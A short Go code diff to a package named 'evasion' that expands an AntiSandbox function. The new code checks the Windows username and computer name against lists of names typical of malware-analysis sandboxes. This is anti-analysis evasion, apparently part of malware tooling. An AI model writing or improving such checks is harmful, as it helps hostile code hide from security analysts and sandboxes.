@@ -5,6 +5,7 @@ package evasion
 import (
 	"os"
 	"runtime"
+	"strings"
 	"time"
 	"unsafe"
 )
@@ -57,8 +58,19 @@ func AntiSandbox() bool {
 	}
 
 	username := os.Getenv("USERNAME")
-	if username == "user" || username == "sand" {
-		return true
+	sandboxUsers := []string{"user", "sand", "sandbox", "malware", "virus", "sample", "test", "analysis", "admin", "Administrator", "John"}
+	for _, su := range sandboxUsers {
+		if strings.EqualFold(username, su) {
+			return true
+		}
+	}
+
+	computerName := os.Getenv("COMPUTERNAME")
+	sandboxNames := []string{"SANDBOX", "MALWARE", "VIRUS", "SAMPLE", "TEST", "ANALYSIS", "DESKTOP"}
+	for _, sn := range sandboxNames {
+		if strings.EqualFold(computerName, sn) {
+			return true
+		}
 	}
 
 	return false
